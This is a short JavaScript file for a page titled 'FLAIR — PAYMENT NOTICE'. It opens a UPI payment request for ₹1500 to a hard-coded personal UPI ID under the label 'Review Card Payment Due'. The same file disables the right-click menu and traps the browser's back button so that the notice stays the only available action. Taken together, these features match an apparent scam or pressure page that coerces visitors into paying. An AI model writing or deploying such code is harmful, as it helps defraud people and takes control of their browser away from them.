"use strict";

/*
    FLAIR — PAYMENT NOTICE

    UPI:
    9910106056@ibl

    Amount:
    ₹1500
*/

const UPI_ID = "9910106056@ibl";
const PAYMENT_AMOUNT = "1500";
const BUSINESS_NAME = "FLAIR";

const payButton = document.getElementById("payButton");

function createUPILink() {
  
  const params = new URLSearchParams({
    pa: UPI_ID,
    pn: BUSINESS_NAME,
    am: PAYMENT_AMOUNT,
    cu: "INR",
    tn: "Review Card Payment Due ₹1500"
  });
  
  return `upi://pay?${params.toString()}`;
}

function openUPIPayment() {
  
  const upiLink = createUPILink();
  
  /*
      Opening the UPI intent lets the phone show
      compatible UPI apps such as PhonePe, Google Pay,
      Paytm, BHIM etc.
  */
  
  window.location.href = upiLink;
}

payButton.addEventListener("click", openUPIPayment);


/*
    Extra protection against accidental page interaction.
    The notice itself remains the only available action.
*/

document.addEventListener("contextmenu", function(event) {
  event.preventDefault();
});


/*
    Prevent browser back/forward from unexpectedly
    returning to a previous review-page state.
*/

history.pushState(null, "", location.href);

window.addEventListener("popstate", function() {
  history.pushState(null, "", location.href);
});
